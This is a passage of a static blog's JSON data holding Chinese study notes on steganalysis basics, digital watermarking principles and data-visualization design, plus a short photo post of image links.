href=\"https://blog.csdn.net/q15516221118/article/details/113617278\">https://blog.csdn.net/q15516221118/article/details/113617278</a></p>\n</li>\n</ul>\n<h3 id=\"三、信息隐藏分析\"><a href=\"#三、信息隐藏分析\" class=\"headerlink\" title=\"三、信息隐藏分析\"></a>三、信息隐藏分析</h3><h4 id=\"1-基本分析步骤\"><a href=\"#1-基本分析步骤\" class=\"headerlink\" title=\"1.基本分析步骤\"></a>1.基本分析步骤</h4><ol>\n<li>检测是否藏有秘密信息；</li>\n<li>如果有，如何进行秘密信息的提取；怎样在不被接受者发现的情况下破坏；</li>\n</ol>\n<h4 id=\"2-发现隐藏信息\"><a href=\"#2-发现隐藏信息\" class=\"headerlink\" title=\"2.发现隐藏信息\"></a>2.发现隐藏信息</h4><ul>\n<li><p>时域隐藏，变换域隐藏，统计等；</p>\n</li>\n<li><p>根据可能的方法判断分析载体的变化来判断是否有信息的隐藏；</p>\n</li>\n<li><p>LSB方法：主观上，查看有无明显的变化；客观上，统计分析噪声特性；</p>\n</li>\n<li><p>调色板方法：一般调色板按照颜色的使用多少排列。是否违反或者有很多空余的调色板索引；</p>\n</li>\n<li><p>变换域方法：尝试变换查找；</p>\n</li>\n<li><p>变形技术：主管分析；</p>\n</li>\n<li><p>载体生成技术：是否符合人类阅读习惯；</p>\n</li>\n<li><p>文件隐藏：文件大小是否异常；</p>\n</li>\n</ul>\n"},{"title":"摄影日常","date":"2023-03-27T11:51:45.000Z","mp3":null,"cover":"img/bg17.jpg","_content":"\n\n\n# 摄影日常\n\n## LCY\n\n![](https://s3.bmp.ovh/imgs/2023/03/27/eabacabc142c6049.jpg)\n\n## Burger King\n\n![](https://s3.bmp.ovh/imgs/2023/03/27/61840edf2a17bb69.jpg)\n\n## Sakura\n\n![](https://s3.bmp.ovh/imgs/2023/03/27/68e8d8970d3f602b.jpg)","source":"_posts/摄影日常.md","raw":"---\ntitle: 摄影日常\ndate: 2023-03-27 19:51:45\ncategories: \n    - 日常\ntags: \n    - 摄影\nmp3: \ncover: img/bg17.jpg\n---\n\n\n\n# 摄影日常\n\n## LCY\n\n![](https://s3.bmp.ovh/imgs/2023/03/27/eabacabc142c6049.jpg)\n\n## Burger King\n\n![](https://s3.bmp.ovh/imgs/2023/03/27/61840edf2a17bb69.jpg)\n\n## Sakura\n\n![](https://s3.bmp.ovh/imgs/2023/03/27/68e8d8970d3f602b.jpg)","slug":"摄影日常","published":1,"updated":"2023-03-27T11:20:45.237Z","_id":"clg29vyhx005cao9cd0ifglyj","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"摄影日常\"><a href=\"#摄影日常\" class=\"headerlink\" title=\"摄影日常\"></a>摄影日常</h1><h2 id=\"LCY\"><a href=\"#LCY\" class=\"headerlink\" title=\"LCY\"></a>LCY</h2><p><img src=\"https://s3.bmp.ovh/imgs/2023/03/27/eabacabc142c6049.jpg\"></p>\n<h2 id=\"Burger-King\"><a href=\"#Burger-King\" class=\"headerlink\" title=\"Burger King\"></a>Burger King</h2><p><img src=\"https://s3.bmp.ovh/imgs/2023/03/27/61840edf2a17bb69.jpg\"></p>\n<h2 id=\"Sakura\"><a href=\"#Sakura\" class=\"headerlink\" title=\"Sakura\"></a>Sakura</h2><p><img src=\"https://s3.bmp.ovh/imgs/2023/03/27/68e8d8970d3f602b.jpg\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"摄影日常\"><a href=\"#摄影日常\" class=\"headerlink\" title=\"摄影日常\"></a>摄影日常</h1><h2 id=\"LCY\"><a href=\"#LCY\" class=\"headerlink\" title=\"LCY\"></a>LCY</h2><p><img src=\"https://s3.bmp.ovh/imgs/2023/03/27/eabacabc142c6049.jpg\"></p>\n<h2 id=\"Burger-King\"><a href=\"#Burger-King\" class=\"headerlink\" title=\"Burger King\"></a>Burger King</h2><p><img src=\"https://s3.bmp.ovh/imgs/2023/03/27/61840edf2a17bb69.jpg\"></p>\n<h2 id=\"Sakura\"><a href=\"#Sakura\" class=\"headerlink\" title=\"Sakura\"></a>Sakura</h2><p><img src=\"https://s3.bmp.ovh/imgs/2023/03/27/68e8d8970d3f602b.jpg\"></p>\n"},{"title":"数字水印","date":"2022-10-29T07:09:01.000Z","mp3":null,"cover":"img/axios.png","_content":"\n\n\n# 数字水印\n\n### 一、基本原理\n\n#### 1.背景\n\n信息隐藏：  伪装通信、隐秘传输；\n\n数字水印：  版权保护；\n\n区别：\n\n|        | 信息隐藏 | 数字水印 |\n| ------ | -------- | -------- |\n| 目标   | 隐藏信息 | 承载标记 |\n| 精准度 | 精确     | 不需要   |\n| 健壮   | 一般     | 强       |\n\n##### 特点：永久嵌入在其他数据中，提供鉴别的信号或模式，并不影响宿主数据的可用性；\n\n安全、可证明、不可感知、健壮\n\n#### 2.健壮性衡量量\n\n- 数据压缩处理\n- 滤波、平滑处理\n- 量化和增强\n- 几何失真\n\n##### 算法组成\n\n水印的加载（打标记）   水印的检测（检测标记）\n\n##### 组成\n\n水印：（1）有效信息；（2）随机序列；\n\n##### 模型\n\n$$\nW'=F(I,W,K)\t\tW'是水印本体；I是载体；\n$$\n\n$$\nIw=E(I,W’)    嵌入\n$$\n\n$$\nW*=D(Iw,I,K)\t提取过程\n$$\n\n#### 3.假设检验原则\n\n虚警率：不存在但是被检测出来\n\n漏检率：存在但是没有检测出来（Better Small）\n\n总错误率=虚警率+漏检率\n\n#### 4.分类\n\n##### 载体上：\n\n- 静止图像水印\n- 视频水印\n- 音频水印\n- 软件水印\n- 文档水印\n\n##### 外观上\n\n1. 可见\n2. 不可见\n\n##### 加载方法上\n\n- 空间域水印：（1）最低有效位方法（2）拼凑方法（3）文档结构微调法\n- 变换域水印：（1）DCT变换（2）DFT变换（3）DWT变换\n\n##### 检测方法分类\n\n私有和公开水印；私钥和公钥水印；\n\n##### 特性上\n\n健壮性：标志保护；\t\t脆弱性：完整性保护；\n\n##### 使用目的上\n\n版权标识水印：版权认证标识；\n\n数字指纹水印：防止非法拷贝；\n\n#### 5.失真度衡量方法\n\n主观性能：等级划分；\n\n客观性能：平均绝对差分；\t\t信噪比 SNR   峰值信噪比 PSNR\n\n### 二、数字水印\n\n#### 1.数字水印本体\n\n##### 要求\n\n能够验证；鲁棒性；\n\n##### 表示形式\n\n- 一窜有意义的字符；\n- 一窜伪随机序列；\n- 一个可视图片；\n\n##### （1）有意义字符方式\n\n包括所有者信息，创作日期，发行部分等相关信息；明文，需要纠错编码，健壮性差；\n\n##### （2）伪随机数列\n\n标识信息与伪随机数列对应；对伪随机序列进行嵌入；\n\n提取端通过相关性检测判断水印存在与否；鲁棒性好；\n\n##### （3）可是图像的数字水印\n\n签名，特定pic，人眼主观鉴定，误码容忍性强；鲁棒性好；\n\n#### 2.数字水印框架\n\n$$\n嵌入 --> 提取（提取的结果可以是水印本身，也可以是相关判决）\n$$\n\n\n\n![](https://s3.bmp.ovh/imgs/2022/10/28/3c7f6c8aac6aed77.png)\n\n### 三、基于空间域的图像水印关键算法\n\n#### 1.最低有效位替换的数字水印嵌入方法\n\n![](https://s3.bmp.ovh/imgs/2022/10/28/0856e991541651bf.png)\n\n#### 2.图像拼凑数字水印方法--嵌入位置选择\n\n安全性考虑、载体质量的影响考虑；\n\n##### 拼凑算法嵌入位置选择\n\n- K密钥->伪随机数->选择n个像素对；\n  a类+1，而b类-1；计算S=Σ(a-b);\n  如果S=2n,则判断嵌入1，如果等于0，嵌入0；\n\n#### 3.基于心理视觉的嵌入位置选择\n\n多在纹理复杂，或者边缘地区嵌入；\n\n（1）P18\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/数字水印.md","raw":"---\ntitle: 数字水印\ndate: 2022-10-29 15:09:01\ncategories: \n    - 数字水印\ntags: \n    - 数字水印\nmp3: \ncover: img/axios.png\n---\n\n\n\n# 数字水印\n\n### 一、基本原理\n\n#### 1.背景\n\n信息隐藏：  伪装通信、隐秘传输；\n\n数字水印：  版权保护；\n\n区别：\n\n|        | 信息隐藏 | 数字水印 |\n| ------ | -------- | -------- |\n| 目标   | 隐藏信息 | 承载标记 |\n| 精准度 | 精确     | 不需要   |\n| 健壮   | 一般     | 强       |\n\n##### 特点：永久嵌入在其他数据中，提供鉴别的信号或模式，并不影响宿主数据的可用性；\n\n安全、可证明、不可感知、健壮\n\n#### 2.健壮性衡量量\n\n- 数据压缩处理\n- 滤波、平滑处理\n- 量化和增强\n- 几何失真\n\n##### 算法组成\n\n水印的加载（打标记）   水印的检测（检测标记）\n\n##### 组成\n\n水印：（1）有效信息；（2）随机序列；\n\n##### 模型\n\n$$\nW'=F(I,W,K)\t\tW'是水印本体；I是载体；\n$$\n\n$$\nIw=E(I,W’)    嵌入\n$$\n\n$$\nW*=D(Iw,I,K)\t提取过程\n$$\n\n#### 3.假设检验原则\n\n虚警率：不存在但是被检测出来\n\n漏检率：存在但是没有检测出来（Better Small）\n\n总错误率=虚警率+漏检率\n\n#### 4.分类\n\n##### 载体上：\n\n- 静止图像水印\n- 视频水印\n- 音频水印\n- 软件水印\n- 文档水印\n\n##### 外观上\n\n1. 可见\n2. 不可见\n\n##### 加载方法上\n\n- 空间域水印：（1）最低有效位方法（2）拼凑方法（3）文档结构微调法\n- 变换域水印：（1）DCT变换（2）DFT变换（3）DWT变换\n\n##### 检测方法分类\n\n私有和公开水印；私钥和公钥水印；\n\n##### 特性上\n\n健壮性：标志保护；\t\t脆弱性：完整性保护；\n\n##### 使用目的上\n\n版权标识水印：版权认证标识；\n\n数字指纹水印：防止非法拷贝；\n\n#### 5.失真度衡量方法\n\n主观性能：等级划分；\n\n客观性能：平均绝对差分；\t\t信噪比 SNR   峰值信噪比 PSNR\n\n### 二、数字水印\n\n#### 1.数字水印本体\n\n##### 要求\n\n能够验证；鲁棒性；\n\n##### 表示形式\n\n- 一窜有意义的字符；\n- 一窜伪随机序列；\n- 一个可视图片；\n\n##### （1）有意义字符方式\n\n包括所有者信息，创作日期，发行部分等相关信息；明文，需要纠错编码，健壮性差；\n\n##### （2）伪随机数列\n\n标识信息与伪随机数列对应；对伪随机序列进行嵌入；\n\n提取端通过相关性检测判断水印存在与否；鲁棒性好；\n\n##### （3）可是图像的数字水印\n\n签名，特定pic，人眼主观鉴定，误码容忍性强；鲁棒性好；\n\n#### 2.数字水印框架\n\n$$\n嵌入 --> 提取（提取的结果可以是水印本身，也可以是相关判决）\n$$\n\n\n\n![](https://s3.bmp.ovh/imgs/2022/10/28/3c7f6c8aac6aed77.png)\n\n### 三、基于空间域的图像水印关键算法\n\n#### 1.最低有效位替换的数字水印嵌入方法\n\n![](https://s3.bmp.ovh/imgs/2022/10/28/0856e991541651bf.png)\n\n#### 2.图像拼凑数字水印方法--嵌入位置选择\n\n安全性考虑、载体质量的影响考虑；\n\n##### 拼凑算法嵌入位置选择\n\n- K密钥->伪随机数->选择n个像素对；\n  a类+1，而b类-1；计算S=Σ(a-b);\n  如果S=2n,则判断嵌入1，如果等于0，嵌入0；\n\n#### 3.基于心理视觉的嵌入位置选择\n\n多在纹理复杂，或者边缘地区嵌入；\n\n（1）P18\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"数字水印","published":1,"updated":"2022-10-29T07:59:07.766Z","_id":"clg29vyhy005gao9c4myxb1g3","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"数字水印\"><a href=\"#数字水印\" class=\"headerlink\" title=\"数字水印\"></a>数字水印</h1><h3 id=\"一、基本原理\"><a href=\"#一、基本原理\" class=\"headerlink\" title=\"一、基本原理\"></a>一、基本原理</h3><h4 id=\"1-背景\"><a href=\"#1-背景\" class=\"headerlink\" title=\"1.背景\"></a>1.背景</h4><p>信息隐藏：  伪装通信、隐秘传输；</p>\n<p>数字水印：  版权保护；</p>\n<p>区别：</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>信息隐藏</th>\n<th>数字水印</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>目标</td>\n<td>隐藏信息</td>\n<td>承载标记</td>\n</tr>\n<tr>\n<td>精准度</td>\n<td>精确</td>\n<td>不需要</td>\n</tr>\n<tr>\n<td>健壮</td>\n<td>一般</td>\n<td>强</td>\n</tr>\n</tbody></table>\n<h5 id=\"特点：永久嵌入在其他数据中，提供鉴别的信号或模式，并不影响宿主数据的可用性；\"><a href=\"#特点：永久嵌入在其他数据中，提供鉴别的信号或模式，并不影响宿主数据的可用性；\" class=\"headerlink\" title=\"特点：永久嵌入在其他数据中，提供鉴别的信号或模式，并不影响宿主数据的可用性；\"></a>特点：永久嵌入在其他数据中，提供鉴别的信号或模式，并不影响宿主数据的可用性；</h5><p>安全、可证明、不可感知、健壮</p>\n<h4 id=\"2-健壮性衡量量\"><a href=\"#2-健壮性衡量量\" class=\"headerlink\" title=\"2.健壮性衡量量\"></a>2.健壮性衡量量</h4><ul>\n<li>数据压缩处理</li>\n<li>滤波、平滑处理</li>\n<li>量化和增强</li>\n<li>几何失真</li>\n</ul>\n<h5 id=\"算法组成\"><a href=\"#算法组成\" class=\"headerlink\" title=\"算法组成\"></a>算法组成</h5><p>水印的加载（打标记）   水印的检测（检测标记）</p>\n<h5 id=\"组成\"><a href=\"#组成\" class=\"headerlink\" title=\"组成\"></a>组成</h5><p>水印：（1）有效信息；（2）随机序列；</p>\n<h5 id=\"模型\"><a href=\"#模型\" class=\"headerlink\" title=\"模型\"></a>模型</h5><p>$$<br>W’=F(I,W,K)        W’是水印本体；I是载体；<br>$$</p>\n<p>$$<br>Iw=E(I,W’)    嵌入<br>$$</p>\n<p>$$<br>W*=D(Iw,I,K)    提取过程<br>$$</p>\n<h4 id=\"3-假设检验原则\"><a href=\"#3-假设检验原则\" class=\"headerlink\" title=\"3.假设检验原则\"></a>3.假设检验原则</h4><p>虚警率：不存在但是被检测出来</p>\n<p>漏检率：存在但是没有检测出来（Better Small）</p>\n<p>总错误率=虚警率+漏检率</p>\n<h4 id=\"4-分类\"><a href=\"#4-分类\" class=\"headerlink\" title=\"4.分类\"></a>4.分类</h4><h5 id=\"载体上：\"><a href=\"#载体上：\" class=\"headerlink\" title=\"载体上：\"></a>载体上：</h5><ul>\n<li>静止图像水印</li>\n<li>视频水印</li>\n<li>音频水印</li>\n<li>软件水印</li>\n<li>文档水印</li>\n</ul>\n<h5 id=\"外观上\"><a href=\"#外观上\" class=\"headerlink\" title=\"外观上\"></a>外观上</h5><ol>\n<li>可见</li>\n<li>不可见</li>\n</ol>\n<h5 id=\"加载方法上\"><a href=\"#加载方法上\" class=\"headerlink\" title=\"加载方法上\"></a>加载方法上</h5><ul>\n<li>空间域水印：（1）最低有效位方法（2）拼凑方法（3）文档结构微调法</li>\n<li>变换域水印：（1）DCT变换（2）DFT变换（3）DWT变换</li>\n</ul>\n<h5 id=\"检测方法分类\"><a href=\"#检测方法分类\" class=\"headerlink\" title=\"检测方法分类\"></a>检测方法分类</h5><p>私有和公开水印；私钥和公钥水印；</p>\n<h5 id=\"特性上\"><a href=\"#特性上\" class=\"headerlink\" title=\"特性上\"></a>特性上</h5><p>健壮性：标志保护；        脆弱性：完整性保护；</p>\n<h5 id=\"使用目的上\"><a href=\"#使用目的上\" class=\"headerlink\" title=\"使用目的上\"></a>使用目的上</h5><p>版权标识水印：版权认证标识；</p>\n<p>数字指纹水印：防止非法拷贝；</p>\n<h4 id=\"5-失真度衡量方法\"><a href=\"#5-失真度衡量方法\" class=\"headerlink\" title=\"5.失真度衡量方法\"></a>5.失真度衡量方法</h4><p>主观性能：等级划分；</p>\n<p>客观性能：平均绝对差分；        信噪比 SNR   峰值信噪比 PSNR</p>\n<h3 id=\"二、数字水印\"><a href=\"#二、数字水印\" class=\"headerlink\" title=\"二、数字水印\"></a>二、数字水印</h3><h4 id=\"1-数字水印本体\"><a href=\"#1-数字水印本体\" class=\"headerlink\" title=\"1.数字水印本体\"></a>1.数字水印本体</h4><h5 id=\"要求\"><a href=\"#要求\" class=\"headerlink\" title=\"要求\"></a>要求</h5><p>能够验证；鲁棒性；</p>\n<h5 id=\"表示形式\"><a href=\"#表示形式\" class=\"headerlink\" title=\"表示形式\"></a>表示形式</h5><ul>\n<li>一窜有意义的字符；</li>\n<li>一窜伪随机序列；</li>\n<li>一个可视图片；</li>\n</ul>\n<h5 id=\"（1）有意义字符方式\"><a href=\"#（1）有意义字符方式\" class=\"headerlink\" title=\"（1）有意义字符方式\"></a>（1）有意义字符方式</h5><p>包括所有者信息，创作日期，发行部分等相关信息；明文，需要纠错编码，健壮性差；</p>\n<h5 id=\"（2）伪随机数列\"><a href=\"#（2）伪随机数列\" class=\"headerlink\" title=\"（2）伪随机数列\"></a>（2）伪随机数列</h5><p>标识信息与伪随机数列对应；对伪随机序列进行嵌入；</p>\n<p>提取端通过相关性检测判断水印存在与否；鲁棒性好；</p>\n<h5 id=\"（3）可是图像的数字水印\"><a href=\"#（3）可是图像的数字水印\" class=\"headerlink\" title=\"（3）可是图像的数字水印\"></a>（3）可是图像的数字水印</h5><p>签名，特定pic，人眼主观鉴定，误码容忍性强；鲁棒性好；</p>\n<h4 id=\"2-数字水印框架\"><a href=\"#2-数字水印框架\" class=\"headerlink\" title=\"2.数字水印框架\"></a>2.数字水印框架</h4><p>$$<br>嵌入 –&gt; 提取（提取的结果可以是水印本身，也可以是相关判决）<br>$$</p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2022/10/28/3c7f6c8aac6aed77.png\"></p>\n<h3 id=\"三、基于空间域的图像水印关键算法\"><a href=\"#三、基于空间域的图像水印关键算法\" class=\"headerlink\" title=\"三、基于空间域的图像水印关键算法\"></a>三、基于空间域的图像水印关键算法</h3><h4 id=\"1-最低有效位替换的数字水印嵌入方法\"><a href=\"#1-最低有效位替换的数字水印嵌入方法\" class=\"headerlink\" title=\"1.最低有效位替换的数字水印嵌入方法\"></a>1.最低有效位替换的数字水印嵌入方法</h4><p><img src=\"https://s3.bmp.ovh/imgs/2022/10/28/0856e991541651bf.png\"></p>\n<h4 id=\"2-图像拼凑数字水印方法–嵌入位置选择\"><a href=\"#2-图像拼凑数字水印方法–嵌入位置选择\" class=\"headerlink\" title=\"2.图像拼凑数字水印方法–嵌入位置选择\"></a>2.图像拼凑数字水印方法–嵌入位置选择</h4><p>安全性考虑、载体质量的影响考虑；</p>\n<h5 id=\"拼凑算法嵌入位置选择\"><a href=\"#拼凑算法嵌入位置选择\" class=\"headerlink\" title=\"拼凑算法嵌入位置选择\"></a>拼凑算法嵌入位置选择</h5><ul>\n<li>K密钥-&gt;伪随机数-&gt;选择n个像素对；<br>a类+1，而b类-1；计算S=Σ(a-b);<br>如果S=2n,则判断嵌入1，如果等于0，嵌入0；</li>\n</ul>\n<h4 id=\"3-基于心理视觉的嵌入位置选择\"><a href=\"#3-基于心理视觉的嵌入位置选择\" class=\"headerlink\" title=\"3.基于心理视觉的嵌入位置选择\"></a>3.基于心理视觉的嵌入位置选择</h4><p>多在纹理复杂，或者边缘地区嵌入；</p>\n<p>（1）P18</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"数字水印\"><a href=\"#数字水印\" class=\"headerlink\" title=\"数字水印\"></a>数字水印</h1><h3 id=\"一、基本原理\"><a href=\"#一、基本原理\" class=\"headerlink\" title=\"一、基本原理\"></a>一、基本原理</h3><h4 id=\"1-背景\"><a href=\"#1-背景\" class=\"headerlink\" title=\"1.背景\"></a>1.背景</h4><p>信息隐藏：  伪装通信、隐秘传输；</p>\n<p>数字水印：  版权保护；</p>\n<p>区别：</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>信息隐藏</th>\n<th>数字水印</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>目标</td>\n<td>隐藏信息</td>\n<td>承载标记</td>\n</tr>\n<tr>\n<td>精准度</td>\n<td>精确</td>\n<td>不需要</td>\n</tr>\n<tr>\n<td>健壮</td>\n<td>一般</td>\n<td>强</td>\n</tr>\n</tbody></table>\n<h5 id=\"特点：永久嵌入在其他数据中，提供鉴别的信号或模式，并不影响宿主数据的可用性；\"><a href=\"#特点：永久嵌入在其他数据中，提供鉴别的信号或模式，并不影响宿主数据的可用性；\" class=\"headerlink\" title=\"特点：永久嵌入在其他数据中，提供鉴别的信号或模式，并不影响宿主数据的可用性；\"></a>特点：永久嵌入在其他数据中，提供鉴别的信号或模式，并不影响宿主数据的可用性；</h5><p>安全、可证明、不可感知、健壮</p>\n<h4 id=\"2-健壮性衡量量\"><a href=\"#2-健壮性衡量量\" class=\"headerlink\" title=\"2.健壮性衡量量\"></a>2.健壮性衡量量</h4><ul>\n<li>数据压缩处理</li>\n<li>滤波、平滑处理</li>\n<li>量化和增强</li>\n<li>几何失真</li>\n</ul>\n<h5 id=\"算法组成\"><a href=\"#算法组成\" class=\"headerlink\" title=\"算法组成\"></a>算法组成</h5><p>水印的加载（打标记）   水印的检测（检测标记）</p>\n<h5 id=\"组成\"><a href=\"#组成\" class=\"headerlink\" title=\"组成\"></a>组成</h5><p>水印：（1）有效信息；（2）随机序列；</p>\n<h5 id=\"模型\"><a href=\"#模型\" class=\"headerlink\" title=\"模型\"></a>模型</h5><p>$$<br>W’=F(I,W,K)        W’是水印本体；I是载体；<br>$$</p>\n<p>$$<br>Iw=E(I,W’)    嵌入<br>$$</p>\n<p>$$<br>W*=D(Iw,I,K)    提取过程<br>$$</p>\n<h4 id=\"3-假设检验原则\"><a href=\"#3-假设检验原则\" class=\"headerlink\" title=\"3.假设检验原则\"></a>3.假设检验原则</h4><p>虚警率：不存在但是被检测出来</p>\n<p>漏检率：存在但是没有检测出来（Better Small）</p>\n<p>总错误率=虚警率+漏检率</p>\n<h4 id=\"4-分类\"><a href=\"#4-分类\" class=\"headerlink\" title=\"4.分类\"></a>4.分类</h4><h5 id=\"载体上：\"><a href=\"#载体上：\" class=\"headerlink\" title=\"载体上：\"></a>载体上：</h5><ul>\n<li>静止图像水印</li>\n<li>视频水印</li>\n<li>音频水印</li>\n<li>软件水印</li>\n<li>文档水印</li>\n</ul>\n<h5 id=\"外观上\"><a href=\"#外观上\" class=\"headerlink\" title=\"外观上\"></a>外观上</h5><ol>\n<li>可见</li>\n<li>不可见</li>\n</ol>\n<h5 id=\"加载方法上\"><a href=\"#加载方法上\" class=\"headerlink\" title=\"加载方法上\"></a>加载方法上</h5><ul>\n<li>空间域水印：（1）最低有效位方法（2）拼凑方法（3）文档结构微调法</li>\n<li>变换域水印：（1）DCT变换（2）DFT变换（3）DWT变换</li>\n</ul>\n<h5 id=\"检测方法分类\"><a href=\"#检测方法分类\" class=\"headerlink\" title=\"检测方法分类\"></a>检测方法分类</h5><p>私有和公开水印；私钥和公钥水印；</p>\n<h5 id=\"特性上\"><a href=\"#特性上\" class=\"headerlink\" title=\"特性上\"></a>特性上</h5><p>健壮性：标志保护；        脆弱性：完整性保护；</p>\n<h5 id=\"使用目的上\"><a href=\"#使用目的上\" class=\"headerlink\" title=\"使用目的上\"></a>使用目的上</h5><p>版权标识水印：版权认证标识；</p>\n<p>数字指纹水印：防止非法拷贝；</p>\n<h4 id=\"5-失真度衡量方法\"><a href=\"#5-失真度衡量方法\" class=\"headerlink\" title=\"5.失真度衡量方法\"></a>5.失真度衡量方法</h4><p>主观性能：等级划分；</p>\n<p>客观性能：平均绝对差分；        信噪比 SNR   峰值信噪比 PSNR</p>\n<h3 id=\"二、数字水印\"><a href=\"#二、数字水印\" class=\"headerlink\" title=\"二、数字水印\"></a>二、数字水印</h3><h4 id=\"1-数字水印本体\"><a href=\"#1-数字水印本体\" class=\"headerlink\" title=\"1.数字水印本体\"></a>1.数字水印本体</h4><h5 id=\"要求\"><a href=\"#要求\" class=\"headerlink\" title=\"要求\"></a>要求</h5><p>能够验证；鲁棒性；</p>\n<h5 id=\"表示形式\"><a href=\"#表示形式\" class=\"headerlink\" title=\"表示形式\"></a>表示形式</h5><ul>\n<li>一窜有意义的字符；</li>\n<li>一窜伪随机序列；</li>\n<li>一个可视图片；</li>\n</ul>\n<h5 id=\"（1）有意义字符方式\"><a href=\"#（1）有意义字符方式\" class=\"headerlink\" title=\"（1）有意义字符方式\"></a>（1）有意义字符方式</h5><p>包括所有者信息，创作日期，发行部分等相关信息；明文，需要纠错编码，健壮性差；</p>\n<h5 id=\"（2）伪随机数列\"><a href=\"#（2）伪随机数列\" class=\"headerlink\" title=\"（2）伪随机数列\"></a>（2）伪随机数列</h5><p>标识信息与伪随机数列对应；对伪随机序列进行嵌入；</p>\n<p>提取端通过相关性检测判断水印存在与否；鲁棒性好；</p>\n<h5 id=\"（3）可是图像的数字水印\"><a href=\"#（3）可是图像的数字水印\" class=\"headerlink\" title=\"（3）可是图像的数字水印\"></a>（3）可是图像的数字水印</h5><p>签名，特定pic，人眼主观鉴定，误码容忍性强；鲁棒性好；</p>\n<h4 id=\"2-数字水印框架\"><a href=\"#2-数字水印框架\" class=\"headerlink\" title=\"2.数字水印框架\"></a>2.数字水印框架</h4><p>$$<br>嵌入 –&gt; 提取（提取的结果可以是水印本身，也可以是相关判决）<br>$$</p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2022/10/28/3c7f6c8aac6aed77.png\"></p>\n<h3 id=\"三、基于空间域的图像水印关键算法\"><a href=\"#三、基于空间域的图像水印关键算法\" class=\"headerlink\" title=\"三、基于空间域的图像水印关键算法\"></a>三、基于空间域的图像水印关键算法</h3><h4 id=\"1-最低有效位替换的数字水印嵌入方法\"><a href=\"#1-最低有效位替换的数字水印嵌入方法\" class=\"headerlink\" title=\"1.最低有效位替换的数字水印嵌入方法\"></a>1.最低有效位替换的数字水印嵌入方法</h4><p><img src=\"https://s3.bmp.ovh/imgs/2022/10/28/0856e991541651bf.png\"></p>\n<h4 id=\"2-图像拼凑数字水印方法–嵌入位置选择\"><a href=\"#2-图像拼凑数字水印方法–嵌入位置选择\" class=\"headerlink\" title=\"2.图像拼凑数字水印方法–嵌入位置选择\"></a>2.图像拼凑数字水印方法–嵌入位置选择</h4><p>安全性考虑、载体质量的影响考虑；</p>\n<h5 id=\"拼凑算法嵌入位置选择\"><a href=\"#拼凑算法嵌入位置选择\" class=\"headerlink\" title=\"拼凑算法嵌入位置选择\"></a>拼凑算法嵌入位置选择</h5><ul>\n<li>K密钥-&gt;伪随机数-&gt;选择n个像素对；<br>a类+1，而b类-1；计算S=Σ(a-b);<br>如果S=2n,则判断嵌入1，如果等于0，嵌入0；</li>\n</ul>\n<h4 id=\"3-基于心理视觉的嵌入位置选择\"><a href=\"#3-基于心理视觉的嵌入位置选择\" class=\"headerlink\" title=\"3.基于心理视觉的嵌入位置选择\"></a>3.基于心理视觉的嵌入位置选择</h4><p>多在纹理复杂，或者边缘地区嵌入；</p>\n<p>（1）P18</p>\n"},{"title":"数据可视化","date":"2023-03-27T10:51:45.000Z","mp3":null,"cover":"img/bg10.jpg","_content":"\n\n# 数据可视化\n\n## 一、什么是数据可视化？\n\n> Anything that converts data into a visual representation. \n>\n> Charts\\Graphs\\Maps\\Tables...\n\n### 1.数据可视化分类\n\n- 科学可视化：科学实验数据的直观展示；\n- 信息可视化：对抽象数据的直观展示；\n- 可视分析：对分析结果的直观展示，及交互式反馈，跨学科；\n\n### 2.为社么需要数据可视化？\n\n- 记录信息；\n- 分析推理；\n- 证实假设；\n- 交流思想；\n\n## 二、可视化设计原则和方法\n\n- 糟糕的可视化\n\n![](https://s3.bmp.ovh/imgs/2023/02/13/047ff6801801a0ae.jpg)\n\n- 错误的可视化\n\n![](https://s3.bmp.ovh/imgs/2023/02/13/49b2ca22ec9c3ff1.jpg)\n\n### 1.可视化设计原则\n\n> 能够正确的表达数据中的信息而不产生偏差与歧义；\n\n### 2.透视失真\n\n- 如果数字是由视觉元素表示的，那么他们应该与是视觉元素的感知程度成正比；\n- 使用清晰、详细和彻底的标签，以避免图形失真和含糊不清；\n\n![](https://s3.bmp.ovh/imgs/2023/02/13/e9ae1811c30f03fd.jpg)\n\n> 绿色部分的数据小于蓝色部分，但是视觉上绿色接近于蓝色；\n\n### 3.图形设计&数据尺度\n\n> 图形的每一部分都会产生对其的视觉预期；\n\n- 预期往往决定了眼睛实际看到的东西；\n- 错误的数据洞察，产生于在图形的某个地方不正确的视觉预期；\n\n![](https://s3.bmp.ovh/imgs/2023/02/13/4f7068afb0f91c60.jpg)\n\n> 数据的刻度分布不均匀；\n\n### 4.数据上下文\n\n![](https://s3.bmp.ovh/imgs/2023/02/13/1af9dfd1933e4bc4.jpg)\n\n> 数据范围显示不全，导致误解；\n\n### 5.可视化设计原则\n\n- 准确的展示数据\n- 节省笔墨\n- 节省空间\n- 消除不必要的无价值图形\n- 在最短的事件传达最多的信息\n\n##### Data-ink Ratio\n\n- 数据墨水：可视化图形中不可擦除的核心部分；\n- 最大化数据墨水占比：可视化图形由墨水+空白区域构成；\n- 擦除数据墨水将会减少图形所传达的信息量；\n\n$$\nData-ink-ratio=Data-ink/Total-ink-used-to-print-the-graphics\n$$\n\n![](https://s3.bmp.ovh/imgs/2023/02/13/08a573bf6afb2dff.jpg)\n\n### 6.视觉感知\n\n##### 相对判断和视觉假象\n\n> 人类的视觉系统管擦的是变化而不是绝对值，且容易被边界吸引；\n\n##### 格式塔学派\n\n> 整体决定了部分的性质，部分依从于整体；\n>\n> 结构比元素重要，视觉形象首先作为统一的整体被认知；\n\n![](https://s3.bmp.ovh/imgs/2023/02/13/76fa7f84b9de92b5.jpg)\n\n- 就近原则：视觉元素空间距离上相近时，人们倾向于归于一组；同理，将数据元素放在靠近的位置，可以突出关联性；\n\n![](https://s3.bmp.ovh/imgs/2023/02/13/643b5bf9da7aff3b.jpg)\n\n- 